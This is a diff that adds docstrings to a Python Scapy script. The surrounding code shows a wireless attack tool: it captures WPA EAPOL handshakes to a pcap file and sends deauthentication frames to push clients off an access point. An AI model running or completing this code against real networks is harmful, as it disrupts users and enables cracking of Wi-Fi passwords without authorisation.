@@ -52,13 +52,17 @@ class AccessPoint():
         self.beacon = beacon
 
     def update_signal_strength(self, dbm):
+        """Update signal strength value"""
         self.signal_strength = dbm
 
     def add_client(self, client):
+        """Append new client"""
         self.clients.append(client)
 
 
 def handle_beacon(pkt):
+    """Handle beacon frames"""
+
     bssid = pkt[Dot11].addr3
     ssid = pkt[Dot11Elt].info.decode()
     signal_strength = pkt[RadioTap].dBm_AntSignal
@@ -83,6 +87,8 @@ def get_aps():
 
 
 def save_capture(ap):
+    """Save captured EAPOL messages and beacon frames to a .pcap file"""
+
     writer = PcapWriter('captures/handshake.pcap', append=True)
     for _, packet in ap.eapol_messages.items():
         writer.write(packet)
@@ -90,6 +96,8 @@ def save_capture(ap):
 
 
 def handle_packet(pkt):
+    """Handle different types of 802.11 frames"""
+
     # Handle beacon frames
     if pkt.haslayer(Dot11Beacon) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
         handle_beacon(pkt)
@@ -136,6 +144,8 @@ def handle_packet(pkt):
 
 
 def process_eapol(pkt):
+    """Process EAPOL packet, save key message type"""
+
     msg_type = pkt[EAPOL_KEY].guess_key_number()
     if pkt[Dot11].addr1 in bssid_map:
         bssid_map[pkt[Dot11].addr1].eapol_messages[msg_type] = pkt
@@ -160,6 +170,8 @@ def create_sniff_thread():
 
 
 def deauth(ap, stop):
+    """Craft and send deauthentication packets"""
+    
     while not stop.is_set():
         for client in ap.clients:
             ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
